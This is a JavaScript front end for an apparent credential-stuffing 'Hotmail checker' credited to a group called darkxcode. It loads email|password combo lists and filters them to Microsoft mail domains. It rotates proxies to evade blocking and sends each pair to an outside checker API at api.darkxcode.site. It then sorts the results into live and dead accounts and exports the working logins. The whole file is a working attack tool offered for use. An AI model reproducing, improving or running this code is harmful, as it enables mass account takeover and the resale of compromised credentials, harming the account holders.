/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 2.0
*/

// Global variables
let accounts = [];
let proxies = [];
let currentProxyIndex = 0;
let isChecking = false;
let checkCount = 0;
let totalAccounts = 0;
let liveAccounts = [];
let dieAccounts = [];
let retryAccounts = [];
let errorAccounts = [];
let activeTab = 'live';
let concurrency = 5; // Number of concurrent checks
let activeRequests = 0;

// DOM elements
const apikeyInput = document.getElementById('apikey');
const proxyListInput = document.getElementById('proxyList');
const proxyAuthInput = document.getElementById('proxyAuth');
const proxyTypeInput = document.getElementById('proxyType');
const fileInput = document.getElementById('fileInput');
const fileInfo = document.getElementById('fileInfo');
const accountListInput = document.getElementById('accountList');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const clearBtn = document.getElementById('clearBtn');
const progressFill = document.getElementById('progressFill');
const progressText = document.getElementById('progressText');
const remainingText = document.getElementById('remainingText');
const liveCount = document.getElementById('liveCount');
const dieCount = document.getElementById('dieCount');
const retryCount = document.getElementById('retryCount');
const errorCount = document.getElementById('errorCount');
const resultsContent = document.getElementById('resultsContent');
const exportLiveBtn = document.getElementById('exportLive');
const exportDieBtn = document.getElementById('exportDie');
const exportRetryBtn = document.getElementById('exportRetry');
const exportAllBtn = document.getElementById('exportAll');
const themeToggle = document.getElementById('themeToggle');
const notification = document.getElementById('notification');

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Set current year in copyright
    document.getElementById('currentYear').textContent = new Date().getFullYear();
    
    // Set up event listeners
    setupEventListeners();
    
    // Check for saved theme preference
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'light') {
        document.body.classList.add('light-mode');
        themeToggle.innerHTML = '<i class="fas fa-sun"></i><span>Light Mode</span>';
    }
    
    // Display sample result for demo purposes
    displaySampleResults();
});

// Set up event listeners
function setupEventListeners() {
    // File upload
    fileInput.addEventListener('change', handleFileUpload);
    
    // Start button
    startBtn.addEventListener('click', startChecking);
    
    // Stop button
    stopBtn.addEventListener('click', stopChecking);
    
    // Clear button
    clearBtn.addEventListener('click', clearAll);
    
    // Tab buttons
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            this.classList.add('active');
            activeTab = this.dataset.tab;
            displayResults();
        });
    });
    
    // Export buttons
    exportLiveBtn.addEventListener('click', () => exportResults('live'));
    exportDieBtn.addEventListener('click', () => exportResults('die'));
    exportRetryBtn.addEventListener('click', () => exportResults('retry'));
    exportAllBtn.addEventListener('click', () => exportResults('all'));
    
    // Theme toggle
    themeToggle.addEventListener('click', toggleTheme);
    
    // Account list input validation
    accountListInput.addEventListener('input', validateAccountList);
}

// Handle file upload
function handleFileUpload(e) {
    const file = e.target.files[0];
    if (!file) return;
    
    fileInfo.textContent = `Selected: ${file.name} (${formatFileSize(file.size)})`;
    
    const reader = new FileReader();
    
    reader.onload = function(event) {
        const content = event.target.result;
        parseAccountList(content);
    };
    
    if (file.name.endsWith('.xlsx')) {
        // For XLSX files, we'd need a library like SheetJS
        // For simplicity, we'll just show an error for this demo
        showNotification('XLSX files require additional library. Please use TXT or CSV.', 'error');
        fileInfo.textContent = 'XLSX not supported in demo. Please use TXT or CSV.';
        return;
    } else {
        reader.readAsText(file);
    }
}

// Parse account list from text
function parseAccountList(text) {
    const lines = text.split('\n');
    accounts = [];
    
    for (let line of lines) {
        line = line.trim();
        if (!line) continue;
        
        // Support both email|password and email:password formats
        let email, password;
        if (line.includes('|')) {
            [email, password] = line.split('|').map(s => s.trim());
        } else if (line.includes(':')) {
            [email, password] = line.split(':').map(s => s.trim());
        } else {
            // Skip invalid lines
            continue;
        }
        
        // Validate email format and domain
        if (isValidHotmailEmail(email)) {
            accounts.push({ email, password, original: line });
        }
    }
    
    accountListInput.value = accounts.map(acc => acc.original).join('\n');
    showNotification(`Loaded ${accounts.length} valid accounts from file`, 'success');
}
/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 2.0
*/
// Validate account list from textarea
function validateAccountList() {
    const text = accountListInput.value;
    const lines = text.split('\n');
    let validCount = 0;
    
    for (let line of lines) {
        line = line.trim();
        if (!line) continue;
        
        let email;
        if (line.includes('|')) {
            email = line.split('|')[0].trim();
        } else if (line.includes(':')) {
            email = line.split(':')[0].trim();
        } else {
            continue;
        }
        
        if (isValidHotmailEmail(email)) {
            validCount++;
        }
    }
    
    fileInfo.textContent = `Valid accounts detected: ${validCount}`;
}

// Check if email is a valid Hotmail domain
function isValidHotmailEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) return false;
    
    const domain = email.split('@')[1].toLowerCase();
    const domainnya = domain.split('.')[0].toLowerCase();
    const validDomains = ['hotmail', 'outlook', 'live', 'msn'];
    
    return validDomains.some(validDomain => domainnya === validDomain);
}

// Start checking accounts
function startChecking() {
    // Validate API key
    const apikey = apikeyInput.value.trim();
    if (!apikey) {
        showNotification('Please enter your API key', 'error');
        apikeyInput.focus();
        return;
    }
    
    // Parse accounts from textarea
    parseAccountsFromInput();
    
    if (accounts.length === 0) {
        showNotification('No valid accounts to check', 'error');
        return;
    }
    
    // Parse proxies
    parseProxies();
    
    // Initialize counters
    checkCount = 0;
    totalAccounts = accounts.length;
    liveAccounts = [];
    dieAccounts = [];
    retryAccounts = [];
    errorAccounts = [];
    
    // Update UI
    isChecking = true;
    startBtn.disabled = true;
    stopBtn.disabled = false;
    updateProgress();
    updateCounters();
    
    // Start checking with concurrency
    for (let i = 0; i < Math.min(concurrency, accounts.length); i++) {
        processNextAccount();
    }
    
    showNotification(`Started checking ${accounts.length} accounts`, 'info');
}

// Parse accounts from textarea input
function parseAccountsFromInput() {
    const text = accountListInput.value;
    const lines = text.split('\n');
    accounts = [];
    
    for (let line of lines) {
        line = line.trim();
        if (!line) continue;
        
        let email, password;
        if (line.includes('|')) {
            [email, password] = line.split('|').map(s => s.trim());
        } else if (line.includes(':')) {
            [email, password] = line.split(':').map(s => s.trim());
        } else {
            continue;
        }
        
        if (isValidHotmailEmail(email)) {
            accounts.push({ email, password, original: line });
        }
    }
}

// Parse proxy list
function parseProxies() {
    const proxyText = proxyListInput.value.trim();
    if (proxyText) {
        proxies = proxyText.split('\n')
            .map(p => p.trim())
            .filter(p => p && p.includes(':'));
    } else {
        proxies = [];
    }
}

// Process next account in queue
function processNextAccount() {
    if (!isChecking || checkCount >= accounts.length || activeRequests >= concurrency) {
        return;
    }
    
    const account = accounts[checkCount];
    if (!account) {
        return;
    }
    
    activeRequests++;
    checkCount++;
    
    // Get next proxy for rotation
    let proxy = '';
    if (proxies.length > 0) {
        proxy = proxies[currentProxyIndex % proxies.length];
        currentProxyIndex++;
    }
    
    // Make API request
    checkAccount(account, proxy);
    
    // Update UI
    updateProgress();
    
    // Process next account if we haven't reached concurrency limit
    if (checkCount < accounts.length && activeRequests < concurrency) {
        setTimeout(processNextAccount, 100);
    }
}

// Check single account via API
function checkAccount(account, proxy) {
    const apikey = apikeyInput.value.trim();
    const proxyAuth = proxyAuthInput.value.trim();
    const proxyType = proxyTypeInput.value;
    
    // Build API URL
    let apiUrl = `https://api.darkxcode.site/checker/hotmail/V2/api.php?list=${encodeURIComponent(account.original)}&apikey=${apikey}`;
    
    if (proxy) {
        apiUrl += `&proxy=${encodeURIComponent(proxy)}`;
    }
    
    if (proxyAuth) {
        apiUrl += `&proxyAuth=${encodeURIComponent(proxyAuth)}`;
    }
    
    if (proxyType) {
        apiUrl += `&type_proxy=${proxyType}`;
    }
    
    // Make API request
    $.ajax({
        url: apiUrl,
        method: 'GET',
        timeout: 30000, // 30 seconds timeout
        success: function(response) {
            handleApiResponse(response, account, proxy);
        },
        error: function(xhr, status, error) {
            handleApiError(error, account, proxy);
        },
        complete: function() {
            activeRequests--;
            
            // Process next account
            if (isChecking && checkCount < accounts.length) {
                setTimeout(processNextAccount, 100);
            } else if (checkCount >= accounts.length && activeRequests === 0) {
                // All accounts processed
                finishChecking();
            }
        }
    });
}

// Handle API success response
function handleApiResponse(response, account, proxy) {
    let result;
    
    try {
        // Parse response
        if (typeof response === 'string') {
            response = JSON.parse(response);
        }
        
        // Extract data
        const data = response.data || response;
        const status = data.status || 'error';
        const msg = data.msg || 'No message';
        const email = data.email || account.email;
        const password = data.password || account.password;
        
        // Classify result
        if (status === 'live') {
            result = {
                type: 'live',
                email,
                password,
                message: msg,
                ip: data.ipaddress || 'N/A',
                fullResponse: JSON.stringify(response)
            };
            liveAccounts.push(result);
        } else if (msg.includes('INCORRECT PASSWORD') || msg.includes('ACCOUNT NOT FOUND')) {
            result = {
                type: 'die',
                email,
                password,
                message: msg,
                ip: proxy || 'N/A',
                fullResponse: JSON.stringify(response)
            };
            dieAccounts.push(result);
        } else if (msg.includes('BLOCK') || msg.includes('UNKNOWN RESPONS')) {
            result = {
                type: 'retry',
                email,
                password,
                message: msg,
                ip: proxy || 'N/A',
                fullResponse: JSON.stringify(response)
            };
            retryAccounts.push(result);
        } else {
            result = {
                type: 'error',
                email,
                password,
                message: msg,
                ip: proxy || 'N/A',
                fullResponse: JSON.stringify(response)
            };
            errorAccounts.push(result);
        }
    } catch (e) {
        // Invalid JSON or other error
        result = {
            type: 'error',
            email: account.email,
            password: account.password,
            message: 'Invalid API response: ' + e.message,
            ip: proxy || 'N/A',
            fullResponse: JSON.stringify(response)
        };
        errorAccounts.push(result);
    }
    
    // Update UI
    updateCounters();
    displayNewResult(result);
}
/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 2.0
*/
// Handle API error
function handleApiError(error, account, proxy) {
    const result = {
        type: 'error',
        email: account.email,
        password: account.password,
        message: 'API request failed: ' + error,
        ip: proxy || 'N/A',
        fullResponse: 'Error'
    };
    
    errorAccounts.push(result);
    
    // Update UI
    updateCounters();
    displayNewResult(result);
}

// Finish checking process
function finishChecking() {
    isChecking = false;
    startBtn.disabled = false;
    stopBtn.disabled = true;
    
    showNotification(`Completed checking ${totalAccounts} accounts`, 'success');
}

// Stop checking process
function stopChecking() {
    isChecking = false;
    startBtn.disabled = false;
    stopBtn.disabled = true;
    
    showNotification('Stopped checking accounts', 'warning');
}

// Clear all data
function clearAll() {
    if (isChecking) {
        if (!confirm('Checking is in progress. Are you sure you want to clear all data?')) {
            return;
        }
        stopChecking();
    }
    
    accounts = [];
    liveAccounts = [];
    dieAccounts = [];
    retryAccounts = [];
    errorAccounts = [];
    checkCount = 0;
    totalAccounts = 0;
    
    accountListInput.value = '';
    fileInfo.textContent = 'No file selected';
    fileInput.value = '';
    
    updateProgress();
    updateCounters();
    displayResults();
    
    showNotification('All data cleared', 'info');
}

// Update progress bar
function updateProgress() {
    const progress = totalAccounts > 0 ? (checkCount / totalAccounts) * 100 : 0;
    progressFill.style.width = `${progress}%`;
    progressText.textContent = `${checkCount}/${totalAccounts}`;
    remainingText.textContent = `Remaining: ${totalAccounts - checkCount}`;
}

// Update counters
function updateCounters() {
    liveCount.textContent = liveAccounts.length;
    dieCount.textContent = dieAccounts.length;
    retryCount.textContent = retryAccounts.length;
    errorCount.textContent = errorAccounts.length;
}

// Display new result in UI
function displayNewResult(result) {
    // Create result element
    const resultEl = document.createElement('div');
    resultEl.className = `result-item ${result.type}`;
    
    resultEl.innerHTML = `
        <div class="result-info">
            <div class="result-email">${result.email}</div>
            <div class="result-msg">${result.message}</div>
            <div class="result-ip">IP: ${result.ip}</div>
        </div>
        <div class="result-actions">
            <button class="btn btn-small btn-secondary copy-btn" data-email="${result.email}" data-password="${result.password}" data-message="${result.message}">
                <i class="fas fa-copy"></i> Copy
            </button>
            <button class="btn btn-small btn-danger delete-btn">
                <i class="fas fa-trash"></i> Delete
            </button>
        </div>
    `;
    
    // Add event listeners to buttons
    const copyBtn = resultEl.querySelector('.copy-btn');
    const deleteBtn = resultEl.querySelector('.delete-btn');
    
    copyBtn.addEventListener('click', function() {
        const email = this.dataset.email;
        const password = this.dataset.password;
        const message = this.dataset.message;
        const text = `${email}|${password}|${message}`;
        
        navigator.clipboard.writeText(text).then(() => {
            showNotification('Copied to clipboard', 'success');
        });
    });
    
    deleteBtn.addEventListener('click', function() {
        // Remove from appropriate array
        const index = getResultIndex(result);
        if (index !== -1) {
            if (result.type === 'live') liveAccounts.splice(index, 1);
            else if (result.type === 'die') dieAccounts.splice(index, 1);
            else if (result.type === 'retry') retryAccounts.splice(index, 1);
            else if (result.type === 'error') errorAccounts.splice(index, 1);
            
            updateCounters();
            displayResults();
            showNotification('Result deleted', 'info');
        }
    });
    
    // Add to results container if it matches active tab
    if (activeTab === result.type || activeTab === 'all') {
        const noResults = resultsContent.querySelector('.no-results');
        if (noResults) noResults.remove();
        
        resultsContent.prepend(resultEl);
    }
}

// Get result index in its array
function getResultIndex(result) {
    let array;
    if (result.type === 'live') array = liveAccounts;
    else if (result.type === 'die') array = dieAccounts;
    else if (result.type === 'retry') array = retryAccounts;
    else if (result.type === 'error') array = errorAccounts;
    else return -1;
    
    return array.findIndex(item => 
        item.email === result.email && 
        item.password === result.password && 
        item.message === result.message
    );
}

// Display results based on active tab
function displayResults() {
    let resultsToShow = [];
    
    switch (activeTab) {
        case 'live': resultsToShow = liveAccounts; break;
        case 'die': resultsToShow = dieAccounts; break;
        case 'retry': resultsToShow = retryAccounts; break;
        case 'error': resultsToShow = errorAccounts; break;
        case 'all': resultsToShow = [...liveAccounts, ...dieAccounts, ...retryAccounts, ...errorAccounts]; break;
    }
    
    resultsContent.innerHTML = '';
    
    if (resultsToShow.length === 0) {
        resultsContent.innerHTML = '<div class="no-results">No results to display for this category.</div>';
        return;
    }
    
    // Show in reverse order (newest first)
    for (let i = resultsToShow.length - 1; i >= 0; i--) {
        const result = resultsToShow[i];
        const resultEl = document.createElement('div');
        resultEl.className = `result-item ${result.type}`;
        
        resultEl.innerHTML = `
            <div class="result-info">
                <div class="result-email">${result.email}</div>
                <div class="result-msg">${result.message}</div>
                <div class="result-ip">IP: ${result.ip}</div>
            </div>
            <div class="result-actions">
                <button class="btn btn-small btn-secondary copy-btn" data-email="${result.email}" data-password="${result.password}" data-message="${result.message}">
                    <i class="fas fa-copy"></i> Copy
                </button>
                <button class="btn btn-small btn-danger delete-btn">
                    <i class="fas fa-trash"></i> Delete
                </button>
            </div>
        `;
        
        // Add event listeners
        const copyBtn = resultEl.querySelector('.copy-btn');
        const deleteBtn = resultEl.querySelector('.delete-btn');
        
        copyBtn.addEventListener('click', function() {
            const email = this.dataset.email;
            const password = this.dataset.password;
            const message = this.dataset.message;
            const text = `${email}|${password}|${message}`;
            
            navigator.clipboard.writeText(text).then(() => {
                showNotification('Copied to clipboard', 'success');
            });
        });
        
        deleteBtn.addEventListener('click', function() {
            const index = getResultIndex(result);
            if (index !== -1) {
                if (result.type === 'live') liveAccounts.splice(index, 1);
                else if (result.type === 'die') dieAccounts.splice(index, 1);
                else if (result.type === 'retry') retryAccounts.splice(index, 1);
                else if (result.type === 'error') errorAccounts.splice(index, 1);
                
                updateCounters();
                displayResults();
                showNotification('Result deleted', 'info');
            }
        });
        
        resultsContent.appendChild(resultEl);
    }
}

// Export results to file
function exportResults(type) {
    let data = [];
    let filename = '';
    
    switch (type) {
        case 'live':
            data = liveAccounts;
            filename = 'hotmail_live_results';
            break;
        case 'die':
            data = dieAccounts;
            filename = 'hotmail_die_results';
            break;
        case 'retry':
            data = retryAccounts;
            filename = 'hotmail_retry_results';
            break;
        case 'all':
            data = [...liveAccounts, ...dieAccounts, ...retryAccounts, ...errorAccounts];
            filename = 'hotmail_all_results';
            break;
    }
    
    if (data.length === 0) {
        showNotification(`No ${type} results to export`, 'warning');
        return;
    }
    
    // Format: EMAIL|PASSWORD|MESSAGE(REASONS)
    const content = data.map(item => 
        `${item.email}|${item.password}|${item.message}`
    ).join('\n');
    
    // Create download link
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${filename}_${new Date().toISOString().slice(0,10)}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showNotification(`Exported ${data.length} ${type} results`, 'success');
}

// Toggle dark/light theme
function toggleTheme() {
    document.body.classList.toggle('light-mode');
    
    if (document.body.classList.contains('light-mode')) {
        localStorage.setItem('theme', 'light');
        themeToggle.innerHTML = '<i class="fas fa-sun"></i><span>Light Mode</span>';
    } else {
        localStorage.setItem('theme', 'dark');
        themeToggle.innerHTML = '<i class="fas fa-moon"></i><span>Dark Mode</span>';
    }
}

// Show notification
function showNotification(message, type = 'info') {
    notification.textContent = message;
    notification.className = `notification ${type}`;
    notification.classList.add('show');
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// Format file size
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Display sample results for demo
function displaySampleResults() {
    // This is just for demo purposes
    const sampleResults = [
        {
            type: 'live',
            email: 'example@hotmail.com',
            password: 'Password@123',
            message: 'SUCCESS LOGIN!',
            ip: '45.127.135.53'
        },
        {
            type: 'die',
            email: 'test@outlook.com',
            password: 'WrongPassword',
            message: 'INCORRECT PASSWORD!',
            ip: '103.152.112.12'
        },
        {
            type: 'retry',
            email: 'user@live.com',
            password: 'Pass1234',
            message: 'BLOCK IPS!',
            ip: '192.168.1.1'
        },
        {
            type: 'error',
            email: 'demo@msn.com',
            password: 'Demo@123',
            message: 'Failed to fetch URL!',
            ip: 'N/A'
        }
    ];
    
    // Add sample results after a short delay
    setTimeout(() => {
        sampleResults.forEach(result => {
            if (result.type === 'live') liveAccounts.push(result);
            else if (result.type === 'die') dieAccounts.push(result);
            else if (result.type === 'retry') retryAccounts.push(result);
            else if (result.type === 'error') errorAccounts.push(result);
        });
        
        updateCounters();
    }, 1000);
}

/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 2.0

*/
